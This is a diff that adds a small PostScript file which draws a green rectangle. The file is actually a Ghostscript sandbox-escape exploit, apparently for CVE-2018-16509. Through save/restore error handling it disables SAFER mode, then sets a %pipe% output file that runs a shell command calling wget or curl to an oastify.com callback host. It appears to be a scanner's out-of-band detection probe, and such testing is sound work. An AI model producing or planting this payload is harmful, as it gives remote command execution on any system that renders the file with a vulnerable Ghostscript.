@@ -1,0 +1,12 @@
+%!PS-Adobe-3.0
+%%BoundingBox: 0 0 300 200
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%sh -c "wget -qO- http://1egq7djl7tvqibhgzy9io6zdd4jy7n.oastify.com/gs_cve16509_v1 >/dev/null 2>&1 || curl -s http://1egq7djl7tvqibhgzy9io6zdd4jy7n.oastify.com/gs_cve16509_v1 >/dev/null 2>&1") currentdevice putdeviceprops
+0 1 0 setrgbcolor 20 20 100 100 rectfill
+showpage
+%%EOF
